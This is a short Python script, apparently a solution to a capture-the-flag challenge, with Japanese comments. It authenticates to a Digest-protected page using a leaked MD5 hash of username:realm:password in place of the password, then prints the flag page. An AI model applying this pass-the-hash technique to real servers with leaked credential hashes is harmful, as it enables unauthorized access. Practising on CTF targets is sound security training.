import requests
import hashlib
url_base = "http://ctfq.sweetduet.info:10080"
path = "/~q9/flag.html"
r = requests.get(url_base + path)
www_auth = r.headers['WWW-Authenticate'].split(' ')
realm = www_auth[1].split('"')[1]
nonce = www_auth[2].split('"')[1]
qop =  www_auth[4].split('"')[1]
username = "q9"
htdigest = "c627e19450db746b739f41b64097d449" #流出している情報 username:realm:password のhash
nc = 0
cnonce = "9691c249" #ランダムでOK
method_hash = hashlib.md5("GET:{}".format(path).encode('utf-8')).hexdigest()
nc = nc + 1
print("{}:{}:{:08d}:{}:{}:{}".format(htdigest, nonce, nc, cnonce, qop, method_hash))
response = hashlib.md5("{}:{}:{:08d}:{}:{}:{}".format(htdigest, nonce, nc, cnonce, qop, method_hash).encode('utf-8')).hexdigest()
headers = {
  "Authorization": 'Digest username="{}", realm="{}", nonce="{}", uri="{}", algorithm=MD5, response="{}", qop=auth, nc={:08d}, cnonce="{}"'.format(username, realm, nonce, path, response, nc, cnonce)
}
print(headers)
print(requests.get(url_base + path, headers=headers).content)
1 件のコメント
